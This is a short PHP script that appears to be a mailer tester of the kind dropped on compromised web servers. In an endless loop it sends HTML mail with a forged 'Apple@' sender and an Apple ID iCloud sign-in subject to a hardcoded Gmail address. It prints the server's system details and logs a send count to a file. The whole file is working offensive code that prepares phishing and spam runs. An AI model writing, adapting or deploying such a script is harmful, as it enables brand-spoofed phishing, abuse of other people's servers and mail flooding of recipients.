<?php
$count = 1;
    while (1){ //infinite loop

$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];


$name = "Apple"; $to = "bu9p3t@gmail.com"; $web="$_SERVER[HTTP_HOST]"; 
$subject = "Your Apple ID was used to sign in to iCloud via a web browser"; 
$body = ' 
<a href="https://wikipedia.org/">Tested Mail 1</a> 
<br> 
<a href="https://wikipedia.org/">Tested Mail 2</a> Kids Was Here '; 
$email = "Apple@$web"; 
$headers = 'From: ' .
$email . "\r\n". 
$headers = "Content-type: text/html\r\n"; 'Reply-To: ' . 
$email. "\r\n" . 'X-Mailer: PHP/' . phpversion(); 
if (mail($to,
$subject,
$body,
$headers,$name)) 
{ echo(php_uname()."<br><font color=lime>Email Sended To => $to </font><br>"); 
$cepek = $count."\n";
  echo "Limit Now Send".$count."<br>";
  $ck = fopen("limitcount.txt", "a");
  $ck = fwrite($ck, $cepek);
  $ck = fclose($ck);
  $count=$count+1;
} else 
{ 
echo("<br><font color=red>Not Support For Mailer</font>"); break; 
}



    }

    ?>
